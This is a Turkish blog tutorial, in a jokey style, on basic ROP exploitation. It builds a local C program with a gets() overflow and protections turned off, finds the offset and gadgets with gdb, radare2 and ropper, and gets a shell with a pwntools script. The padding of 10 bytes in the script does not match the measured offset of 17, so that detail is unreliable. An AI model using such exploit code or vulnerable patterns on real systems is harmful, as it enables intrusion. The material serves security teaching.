---
title: Exploit Development (Basic ROP)
layout: post
---

# Şamata yapmadan direktman mevzuya dalacağım.
---
# Aşağıdaki gibi bir C kodu hazırlayıp derleyelim.
---
```c++
void olmekten_degil_lan_acidan_korkuyom() {
  printf("BURAK YILMAZIN ANNE SEVGISI");
  system("/bin/sh");
}
int main(int argc, char **argv) {
    char sikinti[10];
    printf("ANNEEEE\n");
    gets(sikinti);
    return 0;
}
```
---
```zsh
sesh at ASKE in ~/Desktop 
$ gcc -fno-stack-protector -z execstack -no-pie rop.c -o rop
sesh at ASKE in ~/Desktop 
$ file rop
rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=109245b75ae015328ce33fdb566b536d4b8307ad, for GNU/Linux 3.2.0, not stripped
```
---
# Şimdi bu kod n'abıyo ?
---
### 10 byte'lık değeri sikinti değişkeninde tanımlayıp, burak yılmazın anne sevgisini hatırlamamız için ekrana ANNEEEE bastırıyor. Gets ile inputu alıyor ve return 0 ile program sonlanıyor. En tepede ölmekten korkmayan dostumuz için /bin/sh' i çağıran bir system fonksiyonu tanımlanıyor.
---
# Girelim bakalım, mevzuya
---
```zsh
sesh at ASKE in ~/Desktop 
$ radare2 rop
 -- Microloft Visual Radare.NET 2008. Now OOXML Powered!
 ```
 ```c++
[0x00401070]> aaaaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x00401070]> 
```
# 6 dan fazla a basmayın yoksa kapınıza polis geliyor.
---
```c++
[0x00401070]> afl
0x00401070    1 46           entry0
0x004010b0    4 33           sym.deregister_tm_clones
0x004010e0    4 57   -> 51   sym.register_tm_clones
0x00401120    3 33   -> 32   entry.fini0
0x00401150    1 6            entry.init0
0x00401230    1 5            sym.__libc_csu_fini
0x00401238    1 13           sym._fini
0x00401156    1 41           sym.olmekten_degil_lan_acidan_korkuyom
0x00401050    1 6            sym.imp.printf
0x00401040    1 6            sym.imp.system
0x004011c0    4 101          sym.__libc_csu_init
0x004010a0    1 5            sym._dl_relocate_static_pie
0x0040117f    1 51           main
0x00401030    1 6            sym.imp.puts
0x00401060    1 6            sym.imp.gets
0x00401000    3 27           sym._init
[0x00401070]> 
```
---
```nasm
[0x00401070]> pdf @main
┌ 51: int main (int argc, char **argv, char **envp);
│           ; var char **var_20h @ rbp-0x20
│           ; var int64_t var_14h @ rbp-0x14
│           ; var char *s @ rbp-0xa
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           ; DATA XREF from entry0 @ 0x401091
│           0x0040117f      55             push rbp
│           0x00401180      4889e5         mov rbp, rsp
│           0x00401183      4883ec20       sub rsp, 0x20
│           0x00401187      897dec         mov dword [var_14h], edi    ; argc
│           0x0040118a      488975e0       mov qword [var_20h], rsi    ; argv
│           0x0040118e      488d3d930e00.  lea rdi, str.ANNEEEE        ; 0x402028 ; "ANNEEEE" ; const char *s
│           0x00401195      e896feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040119a      488d45f6       lea rax, [s]
│           0x0040119e      4889c7         mov rdi, rax                ; char *s
│           0x004011a1      b800000000     mov eax, 0
│           0x004011a6      e8b5feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x004011ab      b800000000     mov eax, 0
│           0x004011b0      c9             leave
└           0x004011b1      c3             ret
[0x00401070]> 
```
---
```nasm
[0x00401070]> pdf @sym.olmekten_degil_lan_acidan_korkuyom
┌ 41: sym.olmekten_degil_lan_acidan_korkuyom ();
│           0x00401156      55             push rbp
│           0x00401157      4889e5         mov rbp, rsp
│           0x0040115a      488d3da30e00.  lea rdi, str.BURAK_YILMAZIN_ANNE_SEVGISI ; 0x402004 ; "BURAK YILMAZIN ANNE SEVGISI" ; const char *format
│           0x00401161      b800000000     mov eax, 0
│           0x00401166      e8e5feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040116b      488d3dae0e00.  lea rdi, str.bin_sh         ; 0x402020 ; "/bin/sh" ; const char *string
│           0x00401172      b800000000     mov eax, 0
│           0x00401177      e8c4feffff     call sym.imp.system         ; int system(const char *string)
│           0x0040117c      90             nop
│           0x0040117d      5d             pop rbp
└           0x0040117e      c3             ret
[0x00401070]> 
```
---
# Her yerde burak yılmazı gördüğümüz için artık başlayabiliriz
---
#
```zsh
sesh at ASKE in ~/Desktop 
$ gdb -q rop
Reading symbols from rop...
(No debugging symbols found in rop)
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda$
```
```zsh
gdb-peda$ pattern_create 30
'AAA%AAsAABAA$AAnAACAA-AA(AADAA'
gdb-peda$ r
Starting program: /home/sesh/Desktop/rop 
ANNEEEE
'AAA%AAsAABAA$AAnAACAA-AA(AADAA'
```
```nasm
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7f8e7e0 --> 0xfbad2288 
RDX: 0x0 
RSI: 0x4056b1 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA'\n")
RDI: 0x7ffff7f91330 --> 0x0 
RBP: 0x416e414124414142 ('BAA$AAnA')
RSP: 0x7fffffffdff8 ("ACAA-AA(AADAA'")
RIP: 0x4011b1 (<main+50>:	ret)
R8 : 0x7fffffffdfe6 ("'AAA%AAsAABAA$AAnAACAA-AA(AADAA'")
R9 : 0x0 
R10: 0x410 
R11: 0x246 
R12: 0x401070 (<_start>:	endbr64)
R13: 0x7fffffffe0d0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a6 <main+39>:	call   0x401060 <gets@plt>
   0x4011ab <main+44>:	mov    eax,0x0
   0x4011b0 <main+49>:	leave  
=> 0x4011b1 <main+50>:	ret    
   0x4011b2:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x4011bc:	nop    DWORD PTR [rax+0x0]
   0x4011c0 <__libc_csu_init>:	endbr64 
   0x4011c4 <__libc_csu_init+4>:	push   r15
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdff8 ("ACAA-AA(AADAA'")
0008| 0x7fffffffe000 --> 0x274141444141 ("AADAA'")
0016| 0x7fffffffe008 --> 0x7fffffffe0d8 --> 0x7fffffffe41d ("/home/sesh/Desktop/rop")
0024| 0x7fffffffe010 --> 0x100040000 
0032| 0x7fffffffe018 --> 0x40117f (<main>:	push   rbp)
0040| 0x7fffffffe020 --> 0x0 
0048| 0x7fffffffe028 --> 0x12149a401f07ff21 
0056| 0x7fffffffe030 --> 0x401070 (<_start>:	endbr64)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011b1 in main ()
gdb-peda$ x/xg $rsp
0x7fffffffdff8:	0x2841412d41414341
gdb-peda$ pattern_offset 0x2841412d41414341
2900671297627439937 found at offset: 17
gdb-peda$ 
```
---
```zsh
sesh at ASKE in ~/Desktop 
$ objdump -d rop  | grep plt
```
```nasm
Disassembly of section .plt:
0000000000401020 <.plt>:
0000000000401030 <puts@plt>:
  40103b:	e9 e0 ff ff ff       	jmpq   401020 <.plt>
0000000000401040 <system@plt>:
  40104b:	e9 d0 ff ff ff       	jmpq   401020 <.plt>
0000000000401050 <printf@plt>:
  40105b:	e9 c0 ff ff ff       	jmpq   401020 <.plt>
0000000000401060 <gets@plt>:
  40106b:	e9 b0 ff ff ff       	jmpq   401020 <.plt>
  401166:	e8 e5 fe ff ff       	callq  401050 <printf@plt>
  401177:	e8 c4 fe ff ff       	callq  401040 <system@plt>
  401195:	e8 96 fe ff ff       	callq  401030 <puts@plt>
  4011a6:	e8 b5 fe ff ff       	callq  401060 <gets@plt>
```
---
# Al abi system'in adresini (401040)
---
```zsh
sesh at ASKE in ~/Desktop 
$ readelf -a rop | grep DEFAULT   
```
```nasm
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
     6: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.2.5 (2)
     8: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000004002a8     0 SECTION LOCAL  DEFAULT    1 
     2: 00000000004002c4     0 SECTION LOCAL  DEFAULT    2 
     3: 00000000004002e8     0 SECTION LOCAL  DEFAULT    3 
     4: 0000000000400308     0 SECTION LOCAL  DEFAULT    4 
     5: 0000000000400328     0 SECTION LOCAL  DEFAULT    5 
     6: 0000000000400400     0 SECTION LOCAL  DEFAULT    6 
     7: 0000000000400486     0 SECTION LOCAL  DEFAULT    7 
     8: 0000000000400498     0 SECTION LOCAL  DEFAULT    8 
     9: 00000000004004b8     0 SECTION LOCAL  DEFAULT    9 
    10: 0000000000400518     0 SECTION LOCAL  DEFAULT   10 
    11: 0000000000401000     0 SECTION LOCAL  DEFAULT   11 
    12: 0000000000401020     0 SECTION LOCAL  DEFAULT   12 
    13: 0000000000401070     0 SECTION LOCAL  DEFAULT   13 
    14: 0000000000401238     0 SECTION LOCAL  DEFAULT   14 
    15: 0000000000402000     0 SECTION LOCAL  DEFAULT   15 
    16: 0000000000402030     0 SECTION LOCAL  DEFAULT   16 
    17: 0000000000402078     0 SECTION LOCAL  DEFAULT   17 
    18: 0000000000403e00     0 SECTION LOCAL  DEFAULT   18 
    19: 0000000000403e08     0 SECTION LOCAL  DEFAULT   19 
    20: 0000000000403e10     0 SECTION LOCAL  DEFAULT   20 
    21: 0000000000403fe0     0 SECTION LOCAL  DEFAULT   21 
    22: 0000000000404000     0 SECTION LOCAL  DEFAULT   22 
    23: 0000000000404038     0 SECTION LOCAL  DEFAULT   23 
    24: 0000000000404048     0 SECTION LOCAL  DEFAULT   24 
    25: 0000000000000000     0 SECTION LOCAL  DEFAULT   25 
    26: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS init.c
    27: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS static-reloc.c
    28: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    29: 00000000004010b0     0 FUNC    LOCAL  DEFAULT   13 deregister_tm_clones
    30: 00000000004010e0     0 FUNC    LOCAL  DEFAULT   13 register_tm_clones
    31: 0000000000401120     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    32: 0000000000404048     1 OBJECT  LOCAL  DEFAULT   24 completed.7392
    33: 0000000000403e08     0 OBJECT  LOCAL  DEFAULT   19 __do_global_dtors_aux_fin
    34: 0000000000401150     0 FUNC    LOCAL  DEFAULT   13 frame_dummy
    35: 0000000000403e00     0 OBJECT  LOCAL  DEFAULT   18 __frame_dummy_init_array_
    36: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS rop.c
    37: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    38: 000000000040217c     0 OBJECT  LOCAL  DEFAULT   17 __FRAME_END__
    39: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS 
    40: 0000000000403e08     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_end
    41: 0000000000403e10     0 OBJECT  LOCAL  DEFAULT   20 _DYNAMIC
    42: 0000000000403e00     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_start
    43: 0000000000402030     0 NOTYPE  LOCAL  DEFAULT   16 __GNU_EH_FRAME_HDR
    44: 0000000000404000     0 OBJECT  LOCAL  DEFAULT   22 _GLOBAL_OFFSET_TABLE_
    45: 0000000000401230     5 FUNC    GLOBAL DEFAULT   13 __libc_csu_fini
    46: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab
    47: 0000000000404038     0 NOTYPE  WEAK   DEFAULT   23 data_start
    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
    49: 0000000000404048     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    51: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@@GLIBC_2.2.5
    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.2.5
    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    54: 0000000000401156    41 FUNC    GLOBAL DEFAULT   13 olmekten_degil_lan_acidan
    55: 0000000000404038     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
    56: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    58: 0000000000402000     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used
    59: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@@GLIBC_2.2.5
    60: 00000000004011c0   101 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    61: 0000000000404050     0 NOTYPE  GLOBAL DEFAULT   24 _end
    63: 0000000000401070    47 FUNC    GLOBAL DEFAULT   13 _start
    64: 0000000000404048     0 NOTYPE  GLOBAL DEFAULT   24 __bss_start
    65: 000000000040117f    51 FUNC    GLOBAL DEFAULT   13 main
    67: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
```
###    Al abi ölmekten korkmayanın adresini 0000000000401156 -> (401156)
---
```zsh
sesh at ASKE in ~/Desktop 
$ ropper -f rop  | grep pop
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
```
```nasm
0x000000000040112c: adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x10b0; mov byte ptr [rip + 0x2f0b], 1; pop rbp; ret; 
0x0000000000401173: add byte ptr [rax], al; add byte ptr [rax], al; call 0x1040; nop; pop rbp; ret; 
0x0000000000401175: add byte ptr [rax], al; call 0x1040; nop; pop rbp; ret; 
0x0000000000401170: add byte ptr [rax], al; mov eax, 0; call 0x1040; nop; pop rbp; ret; 
0x0000000000401171: add byte ptr [rax], bh; call 0x1040; nop; pop rbp; ret; 
0x000000000040113b: add byte ptr [rcx], al; pop rbp; ret; 
0x0000000000401177: call 0x1040; nop; pop rbp; ret; 
0x0000000000401131: call 0x10b0; mov byte ptr [rip + 0x2f0b], 1; pop rbp; ret; 
0x000000000040116d: cmp eax, 0xeae; mov eax, 0; call 0x1040; nop; pop rbp; ret; 
0x000000000040116c: lea edi, [rip + 0xeae]; mov eax, 0; call 0x1040; nop; pop rbp; ret; 
0x000000000040116b: lea rdi, [rip + 0xeae]; mov eax, 0; call 0x1040; nop; pop rbp; ret; 
0x0000000000401136: mov byte ptr [rip + 0x2f0b], 1; pop rbp; ret; 
0x0000000000401172: mov eax, 0; call 0x1040; nop; pop rbp; ret; 
0x000000000040112f: mov ebp, esp; call 0x10b0; mov byte ptr [rip + 0x2f0b], 1; pop rbp; ret; 
0x000000000040112e: mov rbp, rsp; call 0x10b0; mov byte ptr [rip + 0x2f0b], 1; pop rbp; ret; 
0x000000000040121c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040121e: pop r13; pop r14; pop r15; ret; 
0x0000000000401220: pop r14; pop r15; ret; 
0x0000000000401222: pop r15; ret; 
0x000000000040121b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040121f: pop rbp; pop r14; pop r15; ret; 
0x000000000040113d: pop rbp; ret; 
0x0000000000401223: pop rdi; ret; 
0x0000000000401221: pop rsi; pop r15; ret; 
0x000000000040121d: pop rsp; pop r13; pop r14; pop r15; ret; 
0x000000000040112d: push rbp; mov rbp, rsp; call 0x10b0; mov byte ptr [rip + 0x2f0b], 1; pop rbp; ret; 
0x000000000040117c: nop; pop rbp; ret; 
```
---
# Burada kullanacağımız gadget işimize en yarayan olmalı; pop15; ret -> 0x0000000000401222 -> (401222) (Her bir register için ayrı null byte basmamak adına yalnızca tek pop; ardından ret; olan gadget'ı kullanabiliriz. Amaaa yok abi ben başka bişeyler kullancam diyorsan her gadget için bir null byte basmalısın ki exploit stack e yazıldığı zaman başka bir pop için ona uygun değer vermelisin. Genelde bunun için NULL Byte (0x00) basılır.)
---
# Exploiti yazabilmek için gerekli olanları topladık aç abi bi nano yaz kodu
---
```py
#!/usr/bin/python2
from pwn import *
p = process("./rop")
trash = "A"*10 # 17 - len("/bin/sh") 
system = p64(0x401040)
rop = p64(0x401222)
aci = p64(0x401156)
mevzu = trash  + rop + system + aci
p.send(mevzu)
p.interactive()
```
---
```zsh
sesh at ASKE in ~/Desktop 
$ python2 rop.py 
[+] Starting local process './rop': pid 32683
[*] Switching to interactive mode
ANNEEEE
$ cat /etc/passwd | head -n 5
root:x:0:0::/root:/usr/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
```
---
# Bu kadar karmaşaya ne gerek var ben shell veren fonksiyonun adresini rip'ye tanımlarsam zaten ordan da kod akışını çeviririm diyen tayfa için örnek;
---
```zsh
sesh at ASKE in ~/Desktop 
$ gdb -q rop
Reading symbols from rop...
(No debugging symbols found in rop)
gdb-peda$ r
Starting program: /home/sesh/Desktop/rop 
ANNEEEE
asd
[Inferior 1 (process 35687) exited normally]
Warning: not running
gdb-peda$ disas main
Dump of assembler code for function main:
```
```nasm
   0x000000000040117f <+0>:	push   rbp
   0x0000000000401180 <+1>:	mov    rbp,rsp
   0x0000000000401183 <+4>:	sub    rsp,0x20
   0x0000000000401187 <+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x000000000040118a <+11>:	mov    QWORD PTR [rbp-0x20],rsi
   0x000000000040118e <+15>:	lea    rdi,[rip+0xe93]        # 0x402028
   0x0000000000401195 <+22>:	call   0x401030 <puts@plt>
   0x000000000040119a <+27>:	lea    rax,[rbp-0xa]
   0x000000000040119e <+31>:	mov    rdi,rax
   0x00000000004011a1 <+34>:	mov    eax,0x0
   0x00000000004011a6 <+39>:	call   0x401060 <gets@plt>
   0x00000000004011ab <+44>:	mov    eax,0x0
   0x00000000004011b0 <+49>:	leave  
   0x00000000004011b1 <+50>:	ret    
End of assembler dump.
gdb-peda$ b * 0x00000000004011b0
Breakpoint 1 at 0x4011b0
```
```zsh
gdb-peda$ r
Starting program: /home/sesh/Desktop/rop 
```
```nasm

ANNEEEE
a
[----------------------------------registers-----------------------------------]

RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7f8e7e0 --> 0xfbad2288 
RDX: 0x0 
RSI: 0x4056b1 --> 0xa ('\n')
RDI: 0x7ffff7f91330 --> 0x0 
RBP: 0x7fffffffdff0 --> 0x4011c0 (<__libc_csu_init>:	endbr64)
RSP: 0x7fffffffdfd0 --> 0x7fffffffe0d8 --> 0x7fffffffe41d ("/home/sesh/Desktop/rop")
RIP: 0x4011b0 (<main+49>:	leave)
R8 : 0x7fffffffdfe6 --> 0x61 ('a')
R9 : 0x0 
R10: 0x410 
R11: 0x246 
R12: 0x401070 (<_start>:	endbr64)
R13: 0x7fffffffe0d0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1 <main+34>:	mov    eax,0x0
   0x4011a6 <main+39>:	call   0x401060 <gets@plt>
   0x4011ab <main+44>:	mov    eax,0x0
=> 0x4011b0 <main+49>:	leave  
   0x4011b1 <main+50>:	ret    
   0x4011b2:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x4011bc:	nop    DWORD PTR [rax+0x0]
   0x4011c0 <__libc_csu_init>:	endbr64
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfd0 --> 0x7fffffffe0d8 --> 0x7fffffffe41d ("/home/sesh/Desktop/rop")
0008| 0x7fffffffdfd8 --> 0x100401070 
0016| 0x7fffffffdfe0 --> 0x617fffffffe0d0 
0024| 0x7fffffffdfe8 --> 0x0 
0032| 0x7fffffffdff0 --> 0x4011c0 (<__libc_csu_init>:	endbr64)
0040| 0x7fffffffdff8 --> 0x7ffff7df5153 (<__libc_start_main+243>:	mov    edi,eax)
0048| 0x7fffffffe000 --> 0x0 
0056| 0x7fffffffe008 --> 0x7fffffffe0d8 --> 0x7fffffffe41d ("/home/sesh/Desktop/rop")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value


Breakpoint 1, 0x00000000004011b0 in main ()
gdb-peda$ disas olmekten_degil_lan_acidan_korkuyom 
Dump of assembler code for function olmekten_degil_lan_acidan_korkuyom:
   0x0000000000401156 <+0>:	push   rbp
   0x0000000000401157 <+1>:	mov    rbp,rsp
   0x000000000040115a <+4>:	lea    rdi,[rip+0xea3]        # 0x402004
   0x0000000000401161 <+11>:	mov    eax,0x0
   0x0000000000401166 <+16>:	call   0x401050 <printf@plt>
   0x000000000040116b <+21>:	lea    rdi,[rip+0xeae]        # 0x402020
   0x0000000000401172 <+28>:	mov    eax,0x0
   0x0000000000401177 <+33>:	call   0x401040 <system@plt>
   0x000000000040117c <+38>:	nop
   0x000000000040117d <+39>:	pop    rbp
   0x000000000040117e <+40>:	ret    


End of assembler dump.
gdb-peda$ set follow-fork-mode parent
gdb-peda$ set $rip = 0x0000000000401156
gdb-peda$ c
Continuing.
[Detaching after vfork from child process 35703]
sh-5.0$ date
Prş Şub  6 21:56:53 +03 2020
sh-5.0$ 

```
---
# Author <a href=" https://twitter.com/x67sv">x67sv</a> 
---
